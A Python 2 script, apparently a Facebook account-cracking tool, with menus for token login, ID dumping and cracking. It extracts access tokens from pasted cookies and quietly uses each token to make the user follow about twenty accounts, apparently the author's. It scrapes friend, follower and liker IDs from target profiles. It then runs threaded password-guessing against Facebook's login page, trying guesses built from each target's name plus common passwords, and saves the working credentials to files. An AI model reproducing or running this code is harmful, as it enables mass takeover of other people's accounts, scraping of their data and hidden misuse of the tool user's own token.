#!/usr/bin/python2
# coding=utf-8
# code by Dapunta Khurayra X
# Facebook : Facebook.com/Dapunta.Khurayra.X

import os,sys,uuid,time,datetime,mechanize,itertools,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib,bs4
from multiprocessing.pool import ThreadPool
from datetime import date
def clear():
    if ' linux' in sys.platform.lower():
        os.system('clear')
    elif 'win' in sys.platform.lower():
        os.system('cls')
    else:
        os.system('clear')

try:
        import mechanize
except ImportError:
        os.system("pip2 install mechanize")
try:
        import requests
except ImportError:
        os.system("pip2 install requests bs4")
        os.system("python2 supreme.py")
from requests.exceptions import ConnectionError
from mechanize import Browser
from datetime import datetime

hm = [('Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]')]

br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', hm)]
s = requests.Session()
api = 'https://graph.facebook.com/{}'
hea = {'User-Agent': 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'}

if ("linux" in sys.platform.lower()):

        N = '\x1b[0m'
        G = '\x1b[32m'
        O = '\x1b[37m\x1b[33m'
        R = '\x1b[91m'
else:

        N = ''
        G = ''
        O = ''
        R = ''

def jalan(z):
        for e in z + '\n':
                sys.stdout.write(e)
                sys.stdout.flush()
                time.sleep(0.03)

logo = ("""               ______  _____  ___  ______  _______
              / __/ / / / _ \/ _ \/ __/  |/  / __/
             _\ \/ /_/ / ___/ , _/ _// /|_/ / _/
            /___/\____/_/  /_/|_/___/_/  /_/___/
            
               Coded By : Dapunta Khurayra X
─────────────────────────────────────────────────────────────""")

pw = False
back = 0
loop = 0
threads = []
ok = []
cp = []
id = []
Successful = []
Checkpoint = []
done = []
pw = []
target = []

def login():
    os.system('clear')
    print logo
    print ("   [ Choose Login Methode ]\n")
    print ("   [•] Login With Cookies")
    print ("   [•] Login With Token")
    print ("   [•] Update Script")

def choose_login():
    log = raw_input("\n   [•] Choose : ")
    if log=="":
        print("   [!] Fill In The Correct")
        login()
    elif log=="1":
        log_cookies()
    elif log=="2":
        log_token()
    elif log=="3":
        update_script()
    else:
        print("   [!] Fill In The Correct")
        login()

def log_cookies():
    os.system('clear')
    print logo
    cookie = raw_input("\n   [•] Cookies : ")
    try:
        data = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = {
        'user-agent'                : 'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36', # Jangan Di Ganti Ea Anjink.
        'referer'                   : 'https://m.facebook.com/',
        'host'                      : 'm.facebook.com',
        'origin'                    : 'https://m.facebook.com',
        'upgrade-insecure-requests' : '1',
        'accept-language'           : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control'             : 'max-age=0',
        'accept'                    : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'content-type'              : 'text/html; charset=utf-8'
        }, cookies = {
        'cookie'                    : cookie
        })
        find_token = re.search('(EAAA\w+)', data.text)
        hasil    = '\n* Fail : maybe your cookie invalid !!' if (find_token is None) else '\n* Your fb access token : ' + find_token.group(1)
    except requests.exceptions.ConnectionError:
            print "   [!] No Connection"
    cookie = open("login.txt", 'w')
    cookie.write(find_token.group(1))
    cookie.close()
    jalan('\n   [•] Login Successful')
    bot_follow()

def log_token():
    os.system('clear')
    print logo
    toket = raw_input("\n   [•] Token : ")
    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        zedd = open('login.txt', 'w')
        zedd.write(toket)
        zedd.close()
        jalan('\n   [•] Login Successful')
        bot_follow()
    except KeyError:
        print ("   [!] Token Invalid")
        os.system('clear')
        login()
        
def bot_follow():
    try:
		toket=open('login.txt','r').read()
    except IOError:
		print("   [!] Token Invalid")
        	os.system('rm -rf login.txt')
        menu()
    requests.post('https://graph.facebook.com/1827084332/subscribers?access_token=' + toket)      #Dapunta Khurayra X
    requests.post('https://graph.facebook.com/1673250723/subscribers?access_token=' + toket)      #Dapunta Ratya
    requests.post('https://graph.facebook.com/100000149757897/subscribers?access_token=' + toket) #Dapunta Santana X
    requests.post('https://graph.facebook.com/100000431996038/subscribers?access_token=' + toket) #Almira Gabrielle X
    requests.post('https://graph.facebook.com/1602590373/subscribers?access_token=' + toket)      #Anthonyus Immanuel
    requests.post('https://graph.facebook.com/100000729074466/subscribers?access_token=' + toket) #Abigaille Dirgantara
    requests.post('https://graph.facebook.com/607801156/subscribers?access_token=' + toket)       #Boirah
    requests.post('https://graph.facebook.com/100009340646547/subscribers?access_token=' + toket) #Anita Zuliatin
    requests.post('https://graph.facebook.com/100000415317575/subscribers?access_token=' + toket) #Dapunta Xayonara
    requests.post('https://graph.facebook.com/1676993425/subscribers?access_token=' + toket)      #Wati Waningsih
    requests.post('https://graph.facebook.com/1767051257/subscribers?access_token=' + toket)      #Rofi Nurhanifah
    requests.post('https://graph.facebook.com/100000287398094/subscribers?access_token=' + toket) #Diah Ayu Kharisma
    requests.post('https://graph.facebook.com/100001085079906/subscribers?access_token=' + toket) #Xena Alexander
    requests.post('https://graph.facebook.com/100007559713883/subscribers?access_token=' + toket) #Alexandra Scarlett
    requests.post('https://graph.facebook.com/100000883844839/subscribers?access_token=' + toket) #Arnold Jackqueline X
    requests.post('https://graph.facebook.com/100000424033832/subscribers?access_token=' + toket) #Pebrima Jun Helmi
    requests.post('https://graph.facebook.com/1409058/subscribers?access_token=' + toket)         #Raifan KKR
    requests.post('https://graph.facebook.com/100026490368623/subscribers?access_token=' + toket) #Muh Rizal Fiansyah
    requests.post('https://graph.facebook.com/100015073506062/subscribers?access_token=' + toket) #Angga Kurniawan
    requests.post('https://graph.facebook.com/100002565109395/subscribers?access_token=' + toket) #Mawar Berduri
    requests.post('https://graph.facebook.com/100005395413800/subscribers?access_token=' + toket) #Moh Yayan
    options()
    
def options():
        os.system('clear')
        print logo
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print "\n   [!] Cookies/Token Invalid"
		os.system('rm -rf login.txt')
		os.system('clear')
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print "\n   [!] Cookies/Token Invalid"
		os.system('rm -rf login.txt')
		os.system('clear')
		login()
	except requests.exceptions.ConnectionError:
		print "\n   [!] No Connection"
		exit()
        os.system('clear')
        print logo
        print ("   [•] Welcome "+nama)
        print ("   [•] Your ID : "+id)
        print ("─────────────────────────────────────────────────────────────")
        print ("   [ Choose An Options ]\n")
        print ("   [1] Dump ID From Friend")
        print ("   [2] Dump ID From Public")
        print ("   [3] Dump ID Followers")
        print ("   [4] Dump ID Likers Post")
        print ("   [5] Start Crack")
        print ("   [6] Log Out")
        choose_options()

def choose_options():
    opt = raw_input("\n   [•] Choose : ")
    if opt=="":
        print("   [!] Fill In The Correct")
        options()
    elif opt=="1":
        dump_friend()
    elif opt=="2":
        dump_public()
    elif opt=="3":
        dump_followers()
    elif opt=="4":
        dump_likers()
    elif opt=="5":
        crack()
    elif opt=="6":
        update_script()
    else:
        print("   [!] Fill In The Correct")
        options()

def dump_friend():
        os.system('clear')
        print logo
	global toket
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print("\n   [!] Cookie/Token Invalid")
		os.system('rm -rf login.txt')
		login()
        ih = raw_input("   [•] File Name : ")
        if ih in [""]:
        	exit("   [!] Don't Empty")
        try:
            os.mkdir("dump")
        except:pass
        wrt=open("dump/"+ih+".json","w")
        try:
            for i in s.get(api.format("me/friends?access_token=%s"%(toket)),headers=hea).json()["data"]:
                    id.append(i["id"])
                    wrt.write("%s\n"%(i["id"]))
                    sys.stdout.write(
                            "\r   [•] Total Dump : %s"%(len(id)
                    ));sys.stdout.flush()
            wrt.close()
            print("   [•] Success Dump ID From Friend")
            print("   [•] File Saved At : dump/%s.json "%(ih))
            raw_input("   [ Back ]")
            options()
        except OSError:
            exit("   [!] Dump Failed")

def dump_public():
        os.system('clear')
        print logo
	global toket
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print("\n   [!] Cookie/Token Invalid")
		os.system('rm -rf login.txt')
		login()
        ah = raw_input("   [•] ID Public Target : ")
        ih = raw_input("   [•] File Name        : ")
        if ah in [""]:
        	exit("   [!] Don't Empty")
        try:
            os.mkdir("dump")
        except:pass
        wrt=open("dump/"+ih+".json","w")
        try:
            for i in  s.get(api.format("%s/friends?limit=10000&access_token=%s"%(ah,toket)),headers=hea).json()["data"]:
                    id.append(i["id"])
                    wrt.write("%s\n"%(i["id"]))
                    sys.stdout.write(
                            "\r   [•] ID %s Total Dump %s Please Wait... "%(i["id"],len(id)
                    ));sys.stdout.flush()
            wrt.close()
            print("   [•] Success Dump ID From Public")
            print("   [•] File Saved At : dump/%s.json "%(ih))
            raw_input("   [ Back ]")
            options()
        except OSError:
            exit("   [!] Dump Failed")

def dump_followers():
        os.system('clear')
        print logo
	global toket
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print("\n   [!] Cookie/Token Invalid")
		os.system('rm -rf login.txt')
		login()
        ih = raw_input("   [•] ID Followers Target : ")
        ah = raw_input("   [•] File Name           : ")
        if ih in [""]:
        	exit("   [!] Don't Empty")
        try:
            os.mkdir("dump")
        except:pass
        wrt=open("dump/"+ah+".json","w")
        try:
            for i in  s.get(api.format("%s/subscribers?limit=10000&access_token=%s"%(ih,toket)),headers=hea).json()["data"]:
                    id.append(i["id"])
                    wrt.write("%s\n"%(i["id"]))
                    sys.stdout.write(
                            "\r   [•] ID %s Total Dump %s Please Wait... "%(i["id"],len(id)
                    ));sys.stdout.flush()
            wrt.close()
            print("   [•] Success Dump ID From Followers")
            print("   [•] File Saved At : dump/%s.json "%(ah))
            raw_input("   [ Back ]")
            options()
        except OSError:
            exit("   [!] Dump Failed")

def dump_likers():
        os.system('clear')
        print logo
	global toket
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print("\n   [!] Cookie/Token Invalid")
		os.system('rm -rf login.txt')
		login()
        ah = raw_input("   [•] ID Post Target : ")
        ih = raw_input("   [•] File Name      : ")
        if ah in [""]:
        	exit("   [!] Don't Empty")
        try:
            os.mkdir("dump")
        except:pass
        wrt=open("dump/"+ih+".json","w")
        try:
            for i in  s.get(api.format("%s/likes?limit=10000&access_token=%s"%(ah,toket)),headers=hea).json()["data"]:
                    id.append(i["id"])
                    wrt.write("%s\n"%(i["id"]))
                    sys.stdout.write(
                            "\r   [•] ID %s Total Dump %s Please Wait... "%(i["id"],len(id)
                    ));sys.stdout.flush()
            wrt.close()
            print("   [•] Success Dump ID From Likers Post")
            print("   [•] File Saved At : dump/%s.json "%(ih))
            raw_input("   [ Back ]")
            options()
        except OSError:
                exit("   [!] Dump Failed")

def crack():
    os.system('clear')
    print logo
    print("   [ Choose Methode Crack ]\n")
    print("   [1] Crack With Api")
    print("   [2] Crack With Mbasic")
    print("   [3] Crack With Touch Facebook")
    print("   [4] Crack With M.Facebook")
    print("   [5] Back")
    choose_crack()

def choose_crack():
    cra = raw_input("\n   [•] Choose : ")
    if cra=="":
        print("   [!] Fill In The Correct")
        crack()
    elif cra=="1":
        crack_mbasic()
    elif cra=="2":
        crack_mbasic()
    elif cra=="3":
        crack_mbasic()
    elif cra=="4":
        crack_mbasic()
    elif cra=="5":
        options()
    else:
        print("   [!] Fill In The Correct")
        crack()

# CRACK API
def crack_mbasic():
        os.system('clear')
        print logo
	global toket
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print("\n   [!] Cookie/Token Invalid")
		os.system('rm -rf login.txt')
		login()
        ask = raw_input("   [•] Crack With Password Default/Manual [d/m]? : ")
        if ask.lower() == "m":
                manual()
        file=raw_input("   [•] File Name : ")
        if file in [""]:
        	exit("   [!] Don't Empty")
        try:
                fil = open(file,"r").readlines()
                for id in fil:
                        target.append(id.strip())
        except KeyError:
        	exit("\n   [!] Wrong File Name")
        print("   [•] Result OK Saved To : ok.txt")
        print("   [•] Result CP Saved To : cp.txt")
        try:
                os.mkdir("crack")
        except:
                pass
        m=ThreadPool(30)
        m.map(crack1_mbasic,target)
        results(Successful,Checkpoint)
        exit()

def crack1_mbasic(user):
	global loop
	try:
		a = s.get(api.format('%s?access_token=%s' % (user, toket)), headers=hea).json()
		dp = a['first_name'].lower()
		bk = a['last_name'].lower()
		for password in [dp,dp+'123',dp+'12345','sayang','bismillah','123456','anjing']:
			rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': user, 'pass': password, 'login': 'submit'}, headers={'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0'})
			xo = rex.content
			if 'mbasic_logout_button' in xo or 'save-device' in xo:
				print '\r   [OK] ' +user+ ' | ' +password+                                    ''
				Successful.append(user+' | '+password)
				save = open('ok.txt','a')
				save.write(str(user)+' | '+str(password)+'\n')
				save.close()
				break
			elif 'checkpoint' in xo:
				print '\r   [CP] ' +user+ ' | ' +password+                                    ''
				Checkpoint.append(user+' | '+password)
				save = open('cp.txt','a')
				save.write(str(user)+' | '+str(password)+'\n')
				save.close()
				break
				
		loop += 1
                print "\r   [Crack] %s/%s - ok-:%s - cp-:%s "%(loop,len(target),len(Successful),len(Checkpoint)),;sys.stdout.flush()
        except:
                pass

def manual():
        global pw,loop
        try:
                idt = raw_input("   [•] File Name : ")
                for id in open(idt,"r").readlines():
                        target.append(id.strip())
        except KeyError:
                exit("   [!] File Does Not Exist")
        print ("   [•] Example : sayang,bismillah,123456")
        pw = raw_input("   [•] Password : ").split(",")
        if len(pw) ==0:
                exit("   [!] Dont Empty")
        print("   [•] Result OK Saved To : ok.txt")
        print("   [•] Result CP Saved To : cp.txt")
        try:
                os.mkdir("crack")
        except:
                pass
        m=ThreadPool(30)
        m.map(cs,target)
        results(Successful,Checkpoint)
        exit()

def cs(user):
	global loop,pw
	try:	
		for i in pw:
			rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': user, 'pass': i, 'login': 'submit'}, headers={'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0'})
			xo = rex.content
			if 'mbasic_logout_button' in xo or 'save-device' in xo:
				print '\r   [OK] ' +user+ ' | ' +i+                                    ''
				Successful.append(user+' | '+i)
				save = open('ok.txt','a')
				save.write(str(user)+' | '+str(i)+'\n')
				save.close()
				break
			elif 'checkpoint' in xo:
				print '\r   [CP] ' +user+ ' | ' +i+                                    ''
				Checkpoint.append(user+' | '+i)
				save = open('cp.txt','a')
				save.write(str(user)+' | '+str(i)+'\n')
				save.close()
				break
				
		loop += 1
                print "\r   [Crack] %s/%s - ok-:%s - cp-:%s \033[0m"%(loop,len(target),len(Successful),len(Checkpoint)),;sys.stdout.flush()
        except:
                pass

def results(Successful,Checkpoint):
        if len(Successful) !=0:
                print ("   [OK] : "+str(len(Successful)))
        if len(Checkpoint) !=0:
                print ("   [CP] : "+str(len(Checkpoint)))
        if len(Successful) ==0 and len(Checkpoint) ==0:
                print "\n"
                print ("   [!] No Result Found")
    
if __name__=='__main__':
  login()
